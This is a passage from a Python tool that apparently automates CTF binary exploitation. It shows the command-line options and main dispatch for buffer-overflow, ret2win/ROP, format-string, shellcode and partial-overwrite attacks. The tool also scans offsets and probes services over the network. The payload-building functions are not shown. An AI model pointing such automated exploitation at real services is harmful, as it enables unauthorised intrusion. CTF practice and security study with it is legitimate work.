                         "Use when the service is rate-limited and scanning is hopeless.")
    ap.add_argument("--talk", action="append", default=[], metavar="EXPECT=SEND",
                    help="scripted exchange for menus/multi-step prompts; repeatable. "
                         "Use PAYLOAD as the SEND value where the exploit goes, e.g. "
                         "--talk 'Choice:=2' --talk 'Name:=PAYLOAD'")
    ap.add_argument("--win-arg", action="append", metavar="VAL",
                    help="argument to pass to win(), e.g. 0xC0DE (builds a ROP chain). "
                         "Repeat it for win(a, b): --win-arg 0xDEADBEEF --win-arg 0xCAFEBABE")
    ap.add_argument("--align", action="store_true",
                    help="prepend a realigning `ret` (64-bit movaps crashes); also tried automatically")
    ap.add_argument("--value", help="value for --goal var")
    ap.add_argument("--expect", help="literal for --goal strcmp")
    ap.add_argument("--shellcode-file", help="raw shellcode bytes for shellcode mode")
    ap.add_argument("--buf-addr", help="buffer address for shellcode mode")
    ap.add_argument("--flag-regex", default=DEFAULT_FLAG_RE,
                    help="pattern for this CTF's flags, e.g. 'myctf\\{[^}]*\\}'")
    ap.add_argument("--shell-cmd", default=SHELL_CMD,
                    help="typed after the payload when the reply has no flag, in case win() "
                         "opened a shell instead of printing it")
    ap.add_argument("--no-followup", action="store_true", help="never send --shell-cmd")
    ap.add_argument("--frame-only", action="store_true",
                    help="--goal var: only the plans read from the stack frame, no sweep")
    ap.add_argument("--timeout", type=float, default=3.0)
    ap.add_argument("--idle", type=float, default=0.35)
    ap.add_argument("--max-attempts", type=int, default=120,
                    help="give up after this many payloads (lower it to fail fast)")
    ap.add_argument("--step", type=int, default=4)  # offset stride; 4 on x86, 8 on x64
    ap.add_argument("--fmt-start", type=int, default=1, help="first stack slot for the combined fmt leak")
    ap.add_argument("--fmt-count", type=int, default=30, help="how many consecutive slots to leak+decode")
    ap.add_argument("--offset-start", type=int, default=8,
                    help="first filler length to try when the offset is unknown")
    ap.add_argument("--offset-end", type=int, default=512,
                    help="last filler length to try; raise it for a big buffer")
    ap.add_argument("--filler", default="", metavar="BYTE",
                    help="padding byte, e.g. 'B' or '\\x90'. Default tries A, then others "
                         "automatically when the service says the input was rejected")
    ap.add_argument("--gate-delay", type=float, default=0.25, metavar="SEC",
                    help="pause before answering a challenge-response gate; raised "
                         "automatically if the service rejects instant input")
    ap.add_argument("--badchars", default="", help="escaped bytes to avoid in BOF payload (e.g. '\\x00\\x0a')")
    ap.add_argument("--recon", action="store_true", help="connect, print banner/leaks, exit")
    ap.add_argument("--probe", action="store_true", help="with --recon, send %%p/%%x probes")
    ap.add_argument("--dry-run", action="store_true", help="print payloads, send nothing")
    ap.add_argument("--safe", action="store_true", help="limit scanning to source candidates")
    ap.add_argument("--verbose", action="store_true",
                    help="print every attempt, including payloads skipped for bad bytes")
    ap.add_argument("--log", help="append attempts/flag to this file")
    args = ap.parse_args()

    # Validate numeric options up front. Without this, a leftover placeholder such as
    # 0xWIN reaches int(...,0) deep inside a run and surfaces as an unreadable traceback.
    for opt, raw in (("--addr", args.addr), ("--value", args.value), ("--buf-addr", args.buf_addr)):
        if raw is None:
            continue
        try:
            int(raw, 0)
        except (TypeError, ValueError):
            sys.exit(f"[!] {opt}: expected a number such as 0x401186 or 4198790, got {raw!r}\n"
                     f"    Placeholders (0xWIN, 0xMAGIC, NN) must be replaced with the real\n"
                     f"    value first - find it with:  python3 elftool.py <binary>")

    if args.safe:
        args.max_attempts = min(args.max_attempts, 40)
        args.offset_end = min(args.offset_end, 300)

    if args.port == 0 and not args.dry_run:
        ap.error("--port is required unless --dry-run")
    if not args.host:
        ap.error("--host is required")

    report = get_report(args)
    if report.get("error"):
        print(f"[!] {report['error']}")

    if args.recon:
        return recon(args)

    if args.cyclic or args.crash_oracle:
        bits_c, endian_c = detect_arch(args, report)
        found = cyclic_offset(args, bits_c, endian_c) if args.cyclic else None
        exact = found is not None          # only a cyclic hit pins the offset exactly
        if found is None:
            # No leaked return address? Survival alone is enough, but it only bounds it.
            found = crash_offset(args)
        if found is None:
            print("[!] offset probes failed; falling back to the normal scan")
        elif exact:
            # First, not ONLY: a service can print a piece of the input from anywhere in it,
            # and pinning the run to one offset turned a wrong hit into a dead end.
            args._cyclic = found
        else:
            # crash-oracle: exact offset is at or just above the bound. Sweep a short
            # window byte by byte - a few dozen tries, not the full 8..512 range.
            args.offset_start, args.offset_end, args.step = found, found + 80, 1
            args.max_attempts = max(args.max_attempts, 200)
            print(f"[*] narrowing the scan to {found}..{found + 80} step 1")
            args._crash_bound = found

    mode = args.mode
    goal = args.goal
    if mode == "auto":
        cls = report.get("class")
        if cls in ("bof", "fmt", "both"):
            mode = "fmt" if cls == "fmt" else "bof"
        else:
            mode = "bof"
    if goal == "auto":
        if mode == "fmt":
            goal = "fmt-leak"
        elif report.get("goals", {}).get("strcmp"):
            goal = "strcmp"
        elif report.get("goals", {}).get("deadbeef"):
            goal = "var"
        elif report.get("goals", {}).get("win_functions") or report.get("win_symbols"):
            goal = "ret2win"
        else:
            goal = "ret2win"

    leaked = []
    if not args.dry_run:
        try:
            banner = banner_with_gates(args)
            leaked = extract_addrs(banner)
            args._banner = banner
        except OSError as exc:
            print(f"[!] cannot connect: {exc}")
            return 1

    # A leaked pointer wider than 32 bits proves a 64-bit target. Without this, a
    # remote-only 64-bit challenge (live 5002) silently packs 4-byte addresses and never
    # works unless the user remembers --arch amd64.
    if args.arch == "auto" and not args.binary and any(a > 0xFFFFFFFF for a in leaked):
        args.arch = "amd64"
        print("[*] arch=amd64 inferred from a >32-bit leaked pointer")
    elif args.arch == "auto" and not args.binary and any(
            0x400000 <= a <= 0x4FFFFF for a in list(leaked) + ([int(args.addr, 0)] if args.addr else [])):
        # 64-bit programs are linked at 0x40xxxx; 32-bit ones at 0x0804xxxx (or 0x56... PIE).
        args.arch = "amd64"
        print("[*] arch=amd64 inferred from a code address at 0x40xxxx (where 64-bit programs are linked)")

    if args.verbose and leaked:
        print("[*] leaked:", ", ".join(hex(a) for a in leaked))

    if args.partial:
        rc = partial_overwrite(args, report, detect_arch(args, report)[0])
    elif mode == "fmt":
        rc = run_fmt(args, report)
    elif goal == "var":
        rc = run_var(args, report)
    elif goal == "strcmp":
        rc = run_strcmp(args, report)
    elif goal == "shellcode":
        rc = run_shellcode(args, report)
    else:
        rc = run_bof(args, report, leaked)
    # Safety net: the exploit may have WORKED while the matcher missed an unusual flag
    # format. Show the last response so a human can see it instead of losing the solve.
    if rc != 0 and LAST_RESPONSE:
        print("\n[*] last response (the flag may be here but unrecognised):")
        print(printable(LAST_RESPONSE.decode("latin-1", "replace"))[-400:])
        print("[*] if you can see it above, re-run with --flag-regex '<pattern>'")
    return rc


if __name__ == "__main__":
    sys.exit(main())
